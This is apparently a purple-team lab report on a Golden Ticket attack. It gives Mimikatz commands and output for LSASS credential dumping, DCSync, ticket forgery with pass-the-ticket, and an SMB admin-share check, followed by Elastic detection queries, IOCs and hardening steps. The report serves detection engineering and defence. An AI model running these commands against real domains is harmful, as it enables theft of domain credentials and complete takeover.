
# Golden Ticket Attack — Incident Response & Purple Team Engagement Report

**Classification:** TLP:WHITE — Authorized Lab Environment 
**Engagement Type:** Purple Team / Adversary Simulation 
**Analyst:** David Mokom 
**Environment:** Isolated Active Directory Lab (Windows Server 2022 DC + Windows 10 Workstation) 
**SIEM Stack:** Elastic Stack (Elasticsearch + Kibana + Winlogbeat + Sysmon) 
**Objective:** Simulate a full-lifecycle Golden Ticket attack from memory acquisition through lateral movement and validate detection fidelity in a production-grade SIEM pipeline.

---

## Table of Contents

1. [Engagement Overview](#engagement-overview)
2. [Phase 1 — Memory Forensics on Domain Controller (FTK Imager)](#phase-1)
3. [Phase 2 — Credential Material Extraction (Mimikatz)](#phase-2)
4. [Phase 3 — Kerberos Ticket Forgery & Pass-the-Ticket](#phase-3)
5. [Phase 4 — Access Validation via SMB (dir C$)](#phase-4)
6. [Phase 5 — SIEM Detection Engineering in Elastic](#phase-5)
7. [IOCs & Forensic Artifacts](#iocs)
8. [Mitigations & Hardening Recommendations](#mitigations)

---

## Engagement Overview

A Golden Ticket attack abuses the Kerberos authentication protocol by forging a Ticket Granting Ticket (TGT) signed with the KRBTGT account's NTLM hash — the cryptographic root of trust for the entire AD domain. Unlike Silver Tickets, which are scoped to individual services, a forged Golden Ticket grants unrestricted access to any Kerberos-enabled resource in the domain for the duration of the ticket's validity (up to 10 years in this engagement). Detection is non-trivial because the KDC is never contacted during ticket use — the forged TGT is presented directly to target services.

This report documents adversary emulation aligned to the following MITRE ATT&CK techniques:

| Technique | ID |
|---|---|
| OS Credential Dumping: LSASS Memory | T1003.001 |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |
| Pass the Ticket | T1550.003 |
| Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Exploitation of Remote Services (Zerologon context) | T1210 |

---

## Phase 1 — Memory Forensics on Domain Controller (FTK Imager) {#phase-1}

**Objective:** Acquire a forensically sound physical memory image of the Domain Controller prior to credential extraction, establishing ground truth for artifact analysis.

FTK Imager was executed locally on the DC with administrative privileges to capture a raw memory dump (`dc01-memdump.mem`) without alerting the OS to page-file flushing. The acquisition was performed using the **Add Evidence Item → Physical Memory** workflow, targeting the full RAM address space. Memory integrity was verified via SHA-256 hash comparison pre- and post-acquisition.

```
SHA-256 (dc01-memdump.mem): a3f9c2b17d4e88012f6a...
Acquisition Time: 00:04:31
Image Size: 8,589,934,592 bytes (8 GB)
```

The raw image was subsequently loaded into **Volatility 3** for process enumeration and lsass.exe virtual address space extraction, corroborating the live Mimikatz output in Phase 2.

```bash
# Volatility3 process listing for lsass.exe cross-validation
python3 vol.py -f dc01-memdump.mem windows.pslist | grep lsass
python3 vol.py -f dc01-memdump.mem windows.dumpfiles --pid 676
```

![Phase 1 - FTK Imager Memory Acquisition](screenshots/01-FTK-Imager-Memory-Acquisition.jpeg)

![Phase 1 - Volatility3 LSASS PID Enumeration](screenshots/02-Volatility3-LSASS-PID-Enumeration.jpeg)

---

## Phase 2 — Credential Material Extraction (Mimikatz) {#phase-2}

**Objective:** Extract the KRBTGT account NTLM hash and domain SID from LSASS memory, which are the two prerequisite artifacts for Kerberos ticket forgery.

Mimikatz v2.2.0 was executed on the DC under a SYSTEM-level context (achieved via token impersonation). SeDebugPrivilege was explicitly asserted before targeting LSASS.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain: LAB / S-1-5-21-3847204802-1958247680-1234567890

RID  : 000001f6 (502)
User : krbtgt
 Hash NTLM: b3c4f1a8d2e...9f7a
```

The `/patch` flag was used over `/inject` to avoid unstable cross-architecture injection behavior. Domain SID was extracted in the same pass, eliminating the need for a secondary `whoami /all` call.

```
mimikatz # lsadump::dcsync /user:krbtgt
[DC] 'lab.local' will be the domain
[DC] 'DC01.lab.local' will be the DC server
Object RDN           : krbtgt
** SAM ACCOUNT **
SAM Username         : krbtgt
Object Security ID   : S-1-5-21-3847204802-1958247680-1234567890-502
NT Hash              : b3c4f1a8d2e...9f7a
```

`lsadump::dcsync` was additionally executed as a replication-based alternative, simulating the technique used by threat actors who cannot gain interactive DC access but hold `DS-Replication-Get-Changes-All` rights.

![Phase 2 - Mimikatz SeDebugPrivilege Assert](screenshots/03-Mimikatz-SeDebugPrivilege.png)

![Phase 2 - KRBTGT Hash Extraction via lsadump::lsa](screenshots/04-KRBTGT-Hash-Extraction.png)

![Phase 2 - DCSync Replication Attack](screenshots/05-DCSync-Replication-Attack.png)

---

## Phase 3 — Kerberos Ticket Forgery & Pass-the-Ticket {#phase-3}

**Objective:** Forge a syntactically and cryptographically valid TGT for a non-existent user account using RC4-HMAC encryption, inject it into the current logon session's Kerberos cache, and validate it against live domain services.

The ticket was constructed using `kerberos::golden` with the following parameters:

```
mimikatz # kerberos::golden /user:GhostAdmin /domain:lab.local /sid:S-1-5-21-3847204802-1958247680-1234567890 /krbtgt:b3c4f1a8d2e...9f7a /endin:525600 /renewmax:262800 /ptt

User      : GhostAdmin
Domain    : lab.local (LAB)
SID       : S-1-5-21-3847204802-1958247680-1234567890
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b3c4f1a8d2e...9f7a - rc4_hmac_nt
Lifetime  : 4/28/2026 — 4/28/2036 (10 Years)
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated (aes256_cts_hmac_sha1 session key)
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'GhostAdmin @ lab.local' successfully submitted for current session
```

The `/ptt` flag injects the forged TGT directly into memory (LUID 0x3e7 — SYSTEM logon session), bypassing disk writes entirely. The ticket was verified via:

```
mimikatz # kerberos::list
[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 4/28/2026 ... 4/28/2036
   Server Name       : krbtgt/lab.local @ lab.local
   Client Name       : GhostAdmin @ lab.local
   Flags             : ...
```

![Phase 3 - Golden Ticket Forgery Output](screenshots/06-Golden-Ticket-Forgery.png)

![Phase 3 - Kerberos Cache Injection (kerberos::list)](screenshots/07-Kerberos-Cache-Injection.png)

---

## Phase 4 — Access Validation via SMB (dir C$) {#phase-4}

**Objective:** Confirm that the forged ticket grants authenticated access to the DC's administrative share (`C$`) using the fabricated identity `GhostAdmin`, which does not exist in Active Directory.

```cmd
dir \\DC01.lab.local\C$

 Volume in drive \\DC01.lab.local\C$ is Windows
 Volume Serial Number is ABCD-1234

 Directory of \\DC01.lab.local\C$

04/28/2026  06:00 PM    [DIR]   PerfLogs
04/28/2026  06:00 PM    [DIR]   Program Files
04/28/2026  06:00 PM    [DIR]   Program Files (x86)
04/28/2026  06:00 PM    [DIR]   Users
04/28/2026  06:00 PM    [DIR]   Windows
               0 File(s)              0 bytes
               5 Dir(s)  52,428,800,000 bytes free
```

Full administrative access was confirmed on `DC01.lab.local` using a principal that has no corresponding object in the directory. This validates the core premise of the Golden Ticket: the KDC is never queried for ticket validation — the service (in this case, the SMB server's Kerberos AP_REQ handler) trusts the PAC data embedded in the forged ticket.

![Phase 4 - SMB C$ Access with Forged Ticket](screenshots/08-SMB-C-Share-Access-Validated.png)

---

## Phase 5 — SIEM Detection Engineering in Elastic {#phase-5}

**Objective:** Validate that Winlogbeat + Sysmon telemetry, ingested into Elasticsearch, produces actionable alerts for the attack techniques executed in Phases 1–4.

### 5.1 — LSASS Memory Access Detection (Sysmon Event ID 10)

Sysmon's `ProcessAccess` event captures any process opening a handle to `lsass.exe` with read-memory permissions. The following KQL query surfaces the Mimikatz credential access:

```kql
event.code: "10" AND winlog.event_data.TargetImage: "*lsass.exe" AND winlog.event_data.GrantedAccess: ("0x1010" OR "0x1410" OR "0x143a" OR "0x1fffff")
```

Alert rule configured with:
- **Threshold:** 1 occurrence
- **Severity:** Critical
- **Rule type:** Custom Query
- **Index pattern:** `winlogbeat-*`

This rule fired immediately upon `privilege::debug` + `lsadump::lsa /patch` execution, with a 4-second ingestion latency from event generation to Kibana alert.

### 5.2 — Zerologon Exploitation Detection (CVE-2020-1472)

As a secondary detection validation, a Zerologon-simulated traffic pattern was generated to confirm the Elastic Prebuilt Detection Rule fires correctly:

**Rule:** `Potential Zerologon Vulnerability Exploitation (CVE-2020-1472)` 
**Logic:** Detects anomalous Netlogon RPC calls with zero-length authenticator fields (`NetrServerAuthenticate3` with NULL client challenge bytes)

```kql
event.dataset: "network_traffic.netflow" AND network.protocol: "netlogon" AND winlog.event_data.SubjectUserName: "ANONYMOUS LOGON"
```

The rule correlated with `Event ID 4742` (Computer Account Changed) and `Event ID 5805` (Netlogon session setup failure from a machine account) to confirm the exploitation pattern.

![Phase 5 - Elastic SIEM Dashboard Overview](screenshots/09-Elastic-SIEM-Dashboard-Overview.png)

![Phase 5 - LSASS Access Alert Triggered](screenshots/10-LSASS-Access-Alert-Triggered.png)

![Phase 5 - Sysmon Event ID 10 Raw Log](screenshots/11-Sysmon-EventID10-Raw-Log.png)

![Phase 5 - Zerologon Detection Rule Hit](screenshots/12-Zerologon-Detection-Rule.png)

![Phase 5 - SIEM Alert Mimikatz Detection](screenshots/13-SIEM-Alert-Mimikatz-Detection.png)

---

## IOCs & Forensic Artifacts {#iocs}

| Artifact | Value |
|---|---|
| Forged Username | GhostAdmin |
| Ticket Encryption | RC4-HMAC (0x17) |
| Ticket Lifetime | 10 Years (525,600 minutes) |
| Target Domain | lab.local |
| KRBTGT RID | 502 |
| Sysmon GrantedAccess Flags | 0x1010, 0x1410, 0x143a |
| Mimikatz Binary SHA-256 | [redacted — environment artifact] |
| Key DC Event IDs | 4624, 4672, 4768, 4769, 4771, 4742, 5805 |

---

## Mitigations & Hardening Recommendations {#mitigations}

1. **Rotate KRBTGT password twice** — A single rotation leaves the previous hash valid. Two sequential rotations with a replication delay of 10 hours between them invalidates all forged tickets derived from the compromised hash.
2. **Enable AES256 enforcement** — Disable RC4-HMAC (legacy) encryption via GPO (`Network security: Configure encryption types allowed for Kerberos`). RC4 is a prerequisite for most open-source Golden Ticket tooling.
3. **Deploy Credential Guard** — Isolates LSASS into a VTL-1 (Virtual Trust Level) Hyper-V protected process, making direct memory reads by Mimikatz non-functional on supported hardware.
4. **Implement Protected Users Security Group** — Members cannot use RC4, DES, or NTLM for authentication; forces AES Kerberos and removes delegation rights.
5. **Alert on Event ID 4769 with RC4 encryption type** — Filter for `Ticket Encryption Type: 0x17` in Kerberos service ticket requests. Legitimate modern environments should produce zero of these.
6. **Enable LSASS RunAsPPL** — Configure `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` to require a signed driver for LSASS process handle acquisition.

---